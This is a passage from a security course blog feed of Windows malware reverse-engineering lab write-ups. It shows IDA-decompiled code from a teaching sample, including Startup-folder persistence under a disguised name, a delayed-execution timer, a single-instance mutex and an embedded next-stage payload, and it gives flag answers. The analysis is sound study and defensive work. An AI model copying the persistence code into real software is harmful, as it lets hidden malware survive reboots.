&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>DWORD &lt;span style="color:#a6e22e">sub_140001C80&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD result; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> size_t v1; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD v2; &lt;span style="color:#75715e">// [rsp+20h] [rbp-258h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> CHAR &lt;span style="color:#f92672">*&lt;/span>lpNewFileName; &lt;span style="color:#75715e">// [rsp+28h] [rbp-250h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD pcbBuffer[&lt;span style="color:#ae81ff">4&lt;/span>]; &lt;span style="color:#75715e">// [rsp+30h] [rbp-248h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Buffer[&lt;span style="color:#ae81ff">272&lt;/span>]; &lt;span style="color:#75715e">// [rsp+40h] [rbp-238h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Filename[&lt;span style="color:#ae81ff">272&lt;/span>]; &lt;span style="color:#75715e">// [rsp+150h] [rbp-128h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> GetModuleFileNameA(&lt;span style="color:#ae81ff">0&lt;/span>i64, Filename, &lt;span style="color:#ae81ff">0x104u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> GetUserNameA(Buffer, pcbBuffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v1 &lt;span style="color:#f92672">=&lt;/span> pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( __CFADD__(pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>], v2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpNewFileName &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> CHAR &lt;span style="color:#f92672">*&lt;/span>)malloc(v1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001350(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpNewFileName,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">+&lt;/span> pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;C:&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Users&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">AppData&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Roaming&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Microsoft&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Windows&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Start Menu&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Programs&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Startup&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">SecurityUpdateCheck.exe&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Buffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> CopyFileA(Filename, lpNewFileName, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> SetFileAttributesA(lpNewFileName, &lt;span style="color:#ae81ff">0x26u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA sub_14001C80(解析版)&lt;/p></description></item><item><title>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/</guid><description>&lt;h1 id="simple-reverse---0x172023-lab---winmalware---sub_140001030">
 Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)
 &lt;a class="anchor" href="#simple-reverse---0x172023-lab---winmalware---sub_140001030">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001030 在做什麼，並找出其行為所對應的 MITRE ATT&amp;amp;CK technique ID。
Flag format: FLAG{T1234}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/timezoneapi/nf-timezoneapi-systemtimetofiletime">SystemTimeToFileTime&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createwaitabletimerw">CreateWaitableTimerW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-setwaitabletimer">SetWaitableTimer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001030
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">waitUntil20231118&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE Result; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hTimer; &lt;span style="color:#75715e">// [rsp+30h] [rbp-38h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> SYSTEMTIME SystemTime; &lt;span style="color:#75715e">// [rsp+38h] [rbp-30h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">_FILETIME&lt;/span> FileTime; &lt;span style="color:#75715e">// [rsp+48h] [rbp-20h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> LARGE_INTEGER DueTime; &lt;span style="color:#75715e">// [rsp+50h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wYear &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2023&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMonth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wDay &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wDayOfWeek &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wHour &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMinute &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wSecond &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMilliseconds &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> SystemTimeToFileTime(&lt;span style="color:#f92672">&amp;amp;&lt;/span>SystemTime, &lt;span style="color:#f92672">&amp;amp;&lt;/span>FileTime);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DueTime &lt;span style="color:#f92672">=&lt;/span> FileTime;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Result &lt;span style="color:#f92672">=&lt;/span> CreateWaitableTimerW(&lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hTimer &lt;span style="color:#f92672">=&lt;/span> Result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> SetWaitableTimer(Result, &lt;span style="color:#f92672">&amp;amp;&lt;/span>DueTime, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> WaitForSingleObject(hTimer, &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> Result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>攻擊者的完整意圖&lt;/p></description></item><item><title>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/</guid><description>&lt;h1 id="simple-reverse---0x182023-lab---winmalware---sub_140001120">
 Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)
 &lt;a class="anchor" href="#simple-reverse---0x182023-lab---winmalware---sub_140001120">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001120 在做什麼，並找出其所建立的 Mutex 的名稱。
Flag format: FLAG{mutex_name}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createmutexa">CreateMutexA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/sync/using-mutex-objects">使用 Mutex 物件&lt;/a>
&lt;blockquote>
&lt;p>可以使用 mutex 物件 來保護共用資源，避免多個執行緒或進程同時存取。 每個執行緒都必須等候 mutex 的擁有權，才能執行可存取共用資源的程式碼。 例如，如果數個執行緒共用資料庫的存取權，執行緒可以使用 mutex 物件一次只允許一個執行緒寫入資料庫。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/debug/system-error-codes--0-499-">系統錯誤碼 (0-499)&lt;/a>
&lt;blockquote>
&lt;p>ERROR_ALREADY_EXISTS
183 (0xB7)
無法建立檔案，該檔案已存在。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001120
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">sub_140001120&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{ 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE MutexA; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+20h] [rbp-78h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v3[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [rsp+30h] [rbp-68h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Name[&lt;span style="color:#ae81ff">32&lt;/span>]; &lt;span style="color:#75715e">// [rsp+38h] [rbp-60h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v5[&lt;span style="color:#ae81ff">32&lt;/span>]; &lt;span style="color:#75715e">// [rsp+58h] [rbp-40h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1684234874&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> qmemcpy(v5, &lt;span style="color:#f92672">&amp;amp;&lt;/span>unk_140003348, &lt;span style="color:#ae81ff">0x1Du&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Name[i] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(v3 &lt;span style="color:#f92672">+&lt;/span> i &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">^&lt;/span> v5[i];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MutexA &lt;span style="color:#f92672">=&lt;/span> CreateMutexA(&lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">1&lt;/span>, Name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( MutexA )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(MutexA) &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( MutexA &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">183&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> MutexA;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有個小地方要注意，雖然觀察過source code是非常簡單的建立mutex的操作，題目想要知道的mutex name也非常簡單，只是個xor就知道的東西，不過在實作上需要注意endian的問題，一開始我是直接按照&lt;code>0x64, 0x63, 0x62, 0x7A&lt;/code>的順序，但結果輸出一些ascii的字元，其實他是從後面讀進來再開始操作xor&lt;/p></description></item><item><title>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/</guid><description>&lt;h1 id="simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload">
 Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)
 &lt;a class="anchor" href="#simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>取出 eductf-lab.exe 中的 next stage payload (embedded PE file)，並計算其 MD5 hash。
Flag format: FLAG{462fe0000&amp;hellip;} (hex character must be lowercase)&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>DOS Header
&lt;img src="https://hackmd.io/_uploads/HJ9P9gpfp.png" alt="" />&lt;/li>
&lt;li>NT Headers - Optional Header
&lt;img src="https://hackmd.io/_uploads/SkjNqeazT.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001870
:::spoiler IDA Source Code解析前
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_140001870&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>pe_file, _QWORD &lt;span style="color:#f92672">*&lt;/span>pe_file_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pe_file &lt;span style="color:#f92672">=&lt;/span> byte_140005040;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pe_file_size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">72770&lt;/span>i64; &lt;span style="color:#75715e">// 這是個是怎麼判斷成PE size我也不知道
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">**&lt;/span>pe_file &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>ZM&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(sub_1400013D0(&lt;span style="color:#f92672">*&lt;/span>pe_file) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x20B&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote dll optional header magic check failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote dll magic check failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>進到&lt;code>sub_140001BF0&lt;/code>之後可以先觀察&lt;code>sub_140001870&lt;/code>，前面有source code可以看到他正在比對&lt;code>byte_140005040&lt;/code>的前面兩個字元是不是等於&lt;code>MZ&lt;/code>，也就是一支PE file的magic header，並且又比對了後面0x18的位置是不是等於0x20B，也就是另外一個magic header(用來判斷該程式是否可於64-bits運行)，由以上操作幾乎可以確定駭客把真正的程式(可能是惡意的)塞在正常的PE file中
:::info
如果只是要解題的話，到這邊就可以了，只要利用前一題學到的把&lt;code>byte_140005040&lt;/code>改變他的type，變成&lt;code>char[72770]&lt;/code>，再用Shift+E，把raw data export出來，丟到&lt;a href="https://emn178.github.io/online-tools/md5_checksum.html">online md5 checksum&lt;/a>，就可以得到這支檔案的hash(&lt;code>462fe0007f86957f59824e113f78947c&lt;/code>)
&lt;img src="https://hackmd.io/_uploads/SJoeiepGT.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rk7SigpGp.png" alt="" />
:::&lt;/li>
&lt;li>&lt;code>sub_1400013D0&lt;/code>仔細看他的操作，其實就是把&lt;code>byte_140005040&lt;/code>的地址，加上&lt;code>0x3C&lt;/code>，再取值，就是&lt;code>e_lfanew&lt;/code>，也就是NT Headers的file offset，這個offset加上原本的原本的&lt;code>140005040&lt;/code>就是NT header，所以可以把&lt;code>sub_1400013D0&lt;/code> rename成&lt;code>getNtHdr&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">getNtHdr&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x3C&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
